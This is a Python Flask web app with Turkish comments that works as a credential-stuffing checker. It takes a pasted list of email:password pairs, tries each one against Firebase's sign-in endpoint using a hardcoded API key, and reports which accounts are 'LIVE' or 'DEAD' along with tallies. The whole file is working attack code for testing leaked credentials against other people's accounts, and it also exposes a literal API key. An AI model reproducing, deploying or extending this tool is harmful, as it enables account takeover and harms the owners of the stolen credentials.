import os
import requests
from flask import Flask, render_template, request, jsonify

# Vercel için Flask nesnesinin adı mutlaka 'app' olmalı
app = Flask(__name__)

# Yeni API Key'ini buraya doğrudan tanımladım
API_KEY = "AIzaSyApwFQ4Refm3F7jygYcBogi3r8W4dtXZDY"

def check_account(email, password):
    # Firebase Auth API URL
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    payload = {
        "email": email, 
        "password": password, 
        "returnSecureToken": True
    }
    
    try:
        # Zaman aşımını 10 saniye yaptık ki sunucu hemen pes etmesin
        r = requests.post(url, json=payload, timeout=10)
        
        # Eğer giriş başarılıysa Google 200 döner
        if r.status_code == 200:
            return "LIVE"
        # Şifre yanlışsa veya hesap yoksa
        return "DEAD"
    except Exception as e:
        print(f"Hata oluştu: {e}")
        return "ERROR"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    
    results = []
    stats = {"live": 0, "dead": 0, "checked": 0}

    # ThreadPool hatasından kaçınmak için güvenli döngü
    for line in combos:
        if ":" in line:
            parts = line.split(":")
            if len(parts) >= 2:
                email = parts[0].strip()
                password = parts[1].strip()
                
                status = check_account(email, password)
                
                stats["checked"] += 1
                if status == "LIVE":
                    stats["live"] += 1
                    results.append({"account": f"{email}:{password}", "status": "LIVE"})
                else:
                    stats["dead"] += 1
                    results.append({"account": f"{email}:{password}", "status": "DEAD"})
    
    return jsonify({"results": results, "stats": stats})

if __name__ == '__main__':
    app.run(debug=True)
